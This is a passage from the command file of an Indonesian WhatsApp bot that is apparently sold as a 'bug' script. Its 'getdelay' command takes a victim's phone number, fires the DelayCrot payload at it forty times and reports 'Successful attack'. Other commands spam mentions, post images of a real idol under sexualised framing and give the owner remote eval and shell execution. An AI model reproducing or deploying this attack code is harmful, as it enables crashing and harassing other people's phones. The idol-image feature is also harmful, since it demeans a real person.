      text: "✅",
      key: m.key
    }
  });
}
break;    
case 'getdelay': {
  if (!isCreator) 
    return reply('*[Akses Ditolak!!]*\nFitur Khusus Owner‼️');
    
  if (!q) 
    return reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  reply(`\`𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : ${command}
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

for (let i = 0; i < 20; i++) {
  await DelayCrot(conn, target)
  await DelayCrot(conn, target)
}
  
  conn.sendMessage(from, {
    react: {
      text: "✅",
      key: m.key
    }
  });
}
break;    
   case "ht": case "hidetag": case "h":  {
if (!isCreator) return m.reply("Owner only.");
if (!text) return m.reply(`teks nya mana?`)
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
conn.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break;
    
   case 'sc': case 'script': {
 let teks = 'Script ini di jual, mau beli? klick tombol di bawah\n> no tawar/nego ya pantek'
 let owner = '6283115376765' // ganti sama no owner lu
 let directLink = `https://wa.me/${owner}?text=Bang%20gw%20mau%20beli%20scnya` 
 let thumb = 'https://raw.githubusercontent.com/IkyyExecutive/IkyyBokep/main/uploads/1771868500868_60527_1771868500360_file_767.jpg' 

 const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: { mentionedJid: [m.sender] },
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: '*nina X Nugget*',
 subtitle: 'Script bot nachia',
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia(
 { image: { url: thumb } },
 { upload: conn.waUploadToServer }
 ))
 }),
 body: proto.Message.InteractiveMessage.Body.fromObject({ text: teks }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
 name: 'cta_url',
 buttonParamsJson: JSON.stringify({
 display_text: 'Chat ibnuu kids🤭',
 url: directLink,
 merchant_url: directLink
 })
 }
 ]
 })
 })
 }
 }
 }, { userJid: m.chat, quoted: m });

 await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break    
    case 'papribka':
case 'pap-ribka':
case 'pap-ribkajkt48': {
  const images = [   "https://raw.githubusercontent.com/IkyyExecutive/IkyyBokep/main/uploads/1769786455579_22351_file_500.jpg",
    "https://raw.githubusercontent.com/IkyyExecutive/IkyyBokep/main/uploads/1769787254216_29597_file_502.jpg",
   "https://raw.githubusercontent.com/IkyyExecutive/IkyyBokep/main/uploads/1769786565822_63701_file_501.jpg",
   "https://raw.githubusercontent.com/IkyyExecutive/IkyyBokep/main/uploads/1769787372783_2843_file_503.jpg" 
                  
  ];

  // pilih foto acak
  const randomImg = images[Math.floor(Math.random() * images.length)];

  await conn.sendMessage(
    m.chat,
    {
      image: { url: randomImg },
      caption: "*hayo buat apa kak?, nanti dimarah nugget loh*",
    },
    { quoted: m }
  );
}
break; 
  case "menu": {    
let menu = `
 ▢ name : ${botname}
 ▢ Creator : t.me/sukaLKK
 ▢ Version : ${botver}
 ▢ Type : Case [ MD ]`;

conn.sendMessage(m.chat, {
  footer: `kenzz¿`,
  buttons: [
    {
      buttonId: 'action',
      buttonText: { displayText: '📂 Pilih Menu' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Main Menu',
          sections: [
            {
              title: 'INFORMATION',
              rows: [
                {
                  title: 'Script 📥',
                  description: 'Display Script nachia',
                  id: '.sc'
                },
                {
                  title: 'Owner 👑',
                  description: 'Contact Owner Bot',
                  id: '.owner'
                }
              ]
            },
            {
              title: 'NINA TUTACHIA',
              rows: [
                {
                  title: 'BUG MENU ⚡',
                  description: 'Menampilkan Menu Bug',
                  id: '.nachia'
                },
             {
                  title: 'ALL MENU ⚡',
                  description: 'Menampilkan seluruh menu',
                  id: '.allmenu'
                },
                {
                  title: 'THANKS TO ❤',
                  description: 'Support team',
                  id: '.tqto'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: { url: 'https://files.catbox.moe/u6nlrj.jpeg' },
  caption: menu,
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    mentionedJid: [sender],
    forwardedNewsletterMessageInfo: {
      newsletterName: 'Kenz Ai',
      newsletterJid: '120363405370468533@newsletter'
    },
    externalAdReply: {
      title: 'KENZ AI',
      body: 'Kenzz punya Org',
      thumbnailUrl: 'https://files.catbox.moe/u6nlrj.jpeg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: false
    }
  }
}, { quoted: m });
  break;
}       
     case "tqto": {    
let menu = `
 ▢ name : ${botname}
 ▢ Creator : t.me/nuggettxvec
 ▢ Version : ${botver}
 ▢ Type : Case [ cjs ]

— ⓘ BIG THANKS TO [ ❤ ]
- xyzen
- varhad
- rafz
- dimax
- nasgor 
- alpi 
- arda
- lanz
- kinxzz
- eldz
- kenz crt
- rapip`;

conn.sendMessage(m.chat, {
  footer: `kenzz`,
  buttons: [
    {
      buttonId: 'action',
      buttonText: { displayText: '📂 Pilih Menu' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Nachia Ai 🗯',
          sections: [
            {
              title: 'INFORMATION',
              rows: [
                {
                  title: 'Script 📥',
                  description: 'Display Script nachia',
                  id: '.sc'
                },
                {
                  title: 'Owner 👑',
                  description: 'Contact Owner Bot',
                  id: '.owner'
                }
              ]
            },
            {
              title: 'NINA TUTACHIA',
              rows: [
             {
                  title: 'BACK TO MENU⚡',
                  description: 'kembali ke menu utama',
                  id: '.menu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: { url: 'https://raw.githubusercontent.com/IkyyExecutive/IkyyBokep/main/uploads/1771867779121_27597_1771867778620_file_763.jpg' },
  caption: menu,
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    mentionedJid: [sender],
    forwardedNewsletterMessageInfo: {
      newsletterName: 'kenzz genjor',
      newsletterJid: '120363405370468533@newsletter'
    },
    externalAdReply: {
      title: 'KENZ AMUNISI',
      body: 'Kenzz Ai',
      thumbnailUrl: 'https://raw.githubusercontent.com/IkyyExecutive/IkyyBokep/main/uploads/1771866433889_2931_1771866433403_file_757.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: false
    }
  }
}, { quoted: m });
  break;
}   
   case 'idch':
case 'cekidch': {
 if (!text) return reply(example("LINK CHNYA MANA YA KAK?"))
 if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
 let result = text.split('https://whatsapp.com/channel/')[1]
 let res = await conn.newsletterMetadata("invite", result)

 let teks = `*IDCH:* ${res.id}
*Nama Saluran:* ${res.name}
*Total Pengikut:* ${res.subscribers}
*Status:* ${res.state}
*Verifikasi:* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`

 let imgMsg = null
 if (res.picture) {
 try {
 const fetch = (await import('node-fetch')).default
 let buffer = await (await fetch(res.picture)).buffer()
 imgMsg = (await conn.prepareMessageMedia({ image: buffer }, { upload: conn.waUploadToServer })).imageMessage
 } catch { imgMsg = null }
 }

 const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: { mentionedJid: [m.sender] },
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: !!imgMsg,
 imageMessage: imgMsg
 }),
 body: proto.Message.InteractiveMessage.Body.fromObject({ text: teks }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "nachia punya nugget" }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
 name: 'cta_url',
 buttonParamsJson: JSON.stringify({
 display_text: '🔗 Lihat Saluran',
 url: text,
 merchant_url: text
 })
 },
 {
 name: 'cta_copy',
 buttonParamsJson: JSON.stringify({
 display_text: '📋 Copy ID',
 copy_code: res.id
 })
 }
 ]
 })
 })
 }
 }
 }, { quoted: m })

 await conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
 db.data.users[m.sender].exp += await randomNomor(60)
}
break
   
  case "brat":
case "bratimg": {
 if (!text) return reply(example('teksnya'));
 
 const loadingMsg = await m.reply(`⏳ *Loading please wait...*`);
 
 try {
 const axios = require('axios');
 const { tmpdir } = require('os');
 const { join } = require('path');
 const fs = require('fs');
 const { spawn } = require('child_process');
 const videoUrl = `https://aqul-brat.hf.space/?text=${encodeURIComponent(text)}&mode=animated`;
 const res = await axios.get(videoUrl, { responseType: 'arraybuffer' });
 const tmpMp4 = join(tmpdir(), `brat-${Date.now()}.mp4`);
 const tmpWebp = join(tmpdir(), `brat-${Date.now()}.webp`);
 fs.writeFileSync(tmpMp4, res.data);
 
 await conn.sendMessage(m.chat, { 
 text: `⚙️ *Processing: "${text}"*\n▰▰▰▰▰▰▰▰▰▰ 50%`,
 edit: loadingMsg.key 
 });
 
 await new Promise((resolve, reject) => {
 const ffmpeg = spawn('ffmpeg', [
 '-i', tmpMp4,
 '-vf', 'scale=512:512:force_original_aspect_ratio=decrease,fps=15',
 '-loop', '0',
 '-ss', '0',
 '-t', '6',
 '-an',
 '-vsync', '0',
 '-s', '512x512',
 '-f', 'webp',
 tmpWebp
 ]);
 ffmpeg.on('close', (code) => {
 if (code === 0) resolve();
 else reject(new Error('FFmpeg failed with code ' + code));
 });
 });
 const stickerBuffer = fs.readFileSync(tmpWebp);
 
 await conn.sendMessage(m.chat, { 
 text: `✅ *Nugget pacarnya nachia real, no fek fek!*\n▰▰▰▰▰▰▰▰▰▰ 100%`,
 edit: loadingMsg.key 
 });
 
 await conn.sendMessage(m.chat, {
 sticker: stickerBuffer,
 packname: global.packname,
 author: global.author,
 }, { quoted: loadingMsg });
 
 await conn.sendMessage(m.chat, { delete: loadingMsg.key });
 
 fs.unlinkSync(tmpMp4);
 fs.unlinkSync(tmpWebp);
 } catch (err) {
 console.error("Error:", err);
 await conn.sendMessage(m.chat, { 
 text: '❌ Gagal bikin sticker Brat. Coba lagi nanti bro.',
 edit: loadingMsg.key 
 });
 }
}
break; 
                    
case 'backup': {
 if (!isCreator) return conn.sendMessage(m.chat, { text: '*⚠️ Hanya owner yang bisa melakukan backup!*' }, { quoted: m })
 
 const fs = require('fs')
 const archiver = require('archiver')
 const path = require('path')

 const fileName = `nachia.zip`
 const output = fs.createWriteStream(fileName)
 const archive = archiver('zip', { zlib: { level: 9 } })

 const ownerJid = (Array.isArray(global.owner) ? global.owner[0] : global.owner) + '@s.whatsapp.net'

 output.on('close', async () => {
 await conn.sendMessage(ownerJid, {
 document: fs.readFileSync(fileName),
 fileName: fileName,
 mimetype: 'application/zip',
 caption: '*Backup file sukses*'
 })

 if (m.isGroup) {
 await conn.sendMessage(m.chat, { 
 text: '*✅ Backup berhasil dibuat dan sudah dikirim ke chat pribadi owner!*' 
 }, { quoted: m })
 }

 fs.unlinkSync(fileName) 
 })

 archive.on('error', err => {
 conn.sendMessage(m.chat, { text: `*Gagal membuat backup: ${err.message}*` }, { quoted: m })
 })

 archive.pipe(output)

 const include = [
'database',
'Library',
'Settings',
'nachia.js',
'tmp',
'index.js',
 'Nugget.',
'package.json'
 ]

 include.forEach(p => {
 if (fs.existsSync(p)) {
 const stat = fs.statSync(p)
 if (stat.isDirectory()) archive.directory(p, p)
 else archive.file(p, { name: path.basename(p) })
 }
 })

 archive.finalize()
}
break
        
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})